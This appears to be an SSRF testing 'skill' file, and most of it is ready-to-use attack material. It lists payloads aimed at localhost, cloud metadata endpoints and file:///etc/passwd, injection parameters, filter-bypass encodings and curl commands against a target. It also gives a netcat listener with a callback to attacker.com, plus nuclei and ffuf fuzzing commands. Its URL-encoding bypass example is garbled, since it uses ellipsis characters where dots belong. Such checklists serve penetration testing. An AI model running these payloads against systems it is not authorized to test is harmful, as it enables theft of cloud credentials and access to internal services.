# SSRF Testing Skill

## Overview
Server-Side Request Forgery (SSRF) allows attackers to induce the server to make HTTP requests to arbitrary domains.

## Testing Methodology

### 1. Basic Payloads
```html
# Localhost
http://127.0.0.1/
http://localhost/admin
http://[::1]/

# Cloud metadata
http://169.254.169.254/
http://metadata.google.internal/
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# File inclusion
file:///etc/passwd
dict://localhost:11211/stats
sftp://example.com:22/
```

### 2. Common Injection Points
```
?url=
?uri=
?next=
?data=
?q=
?page=
?feed=
?dest=
?redirect=
?path=
?continue=
?url=
?callback=
?port=
?host=
?server=
```

### 3. Bypass Techniques
```html
# IP encoding
127.0.0.1 = 2130706433 (decimal)
127.0.0.1 = 0x7f000001 (hex)

# URL encoding
http://127.0.0.1 → http://127%E2%80%A60%E2%80%A60%E2%80%A61

# Redirect
http://evil.com@127.0.0.1
http://127.0.0.1@evil.com

# Alternate notation
http://127.1/
http://127.0.1/
```

### 4. Testing Commands
```bash
# Basic test
curl 'http://target.com/url?url=http://127.0.0.1'
curl 'http://target.com/url?url=http://localhost/admin'

# Cloud metadata test
curl 'http://target.com/url?url=http://169.254.169.254/latest/meta-data/'
curl 'http://target.com/url?url=http://metadata.google.internal/'

# Internal port scan
curl 'http://target.com/url?url=http://127.0.0.1:22/'
curl 'http://target.com/url?url=http://127.0.0.1:3306/'

# Protocol testing
curl 'http://target.com/url?url=file:///etc/passwd'
curl 'http://target.com/url?url=dict://localhost:11211/stats'
```

### 5. Blind SSRF
```bash
# Out-of-band detection
# Attacker-controlled server
nc -lvnp 8080

# Payload
curl 'http://target.com/url?url=http://attacker.com:8080/'
```

### 6. Tools
```bash
# nuclei templates
nuclei -u https://target.com -t ssrf.yaml

# ffuf for parameter fuzzing
ffuf -w params.txt -u https://target.com/?url=FUZZ -v
```

## Testing Checklist
- [ ] Identify URL/endpoint parameters
- [ ] Test localhost access
- [ ] Test cloud metadata endpoints
- [ ] Test internal port scanning
- [ ] Test file:// protocol
- [ ] Test bypass techniques
- [ ] Test blind SSRF with OOB
- [ ] Document findings
